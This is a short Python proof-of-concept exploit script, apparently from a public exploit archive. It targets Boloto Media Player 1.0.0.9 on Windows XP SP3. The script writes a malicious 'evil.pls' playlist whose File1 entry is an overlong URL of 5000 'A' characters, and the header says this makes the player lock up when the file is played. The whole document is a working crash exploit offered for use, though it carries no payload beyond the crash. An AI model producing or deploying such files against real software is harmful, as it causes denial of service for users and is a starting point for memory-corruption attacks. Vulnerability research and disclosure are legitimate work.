#!/usr/bin/env python

#############################################################################

#

# Boloto Media Player 1.0.0.9 Local (.PLS) Crash PoC

# Found By: Dr_IDE

# Download: http://www.tucows.com/preview/602821

# Tested On: XPSP3

# Note: It locks hard if you add this file to the playlist and click.

#

#############################################################################


buff = ("\x41" * 5000)


try:

f1 = open("evil.pls","w");

f1.write("[playlist]\nNumberOfFiles=3\n\nFile1=http://" + buff);

f1.close();


except:

print ("[-] Error. File couldn't be created.");



#[pocoftheday.blogspot.com] 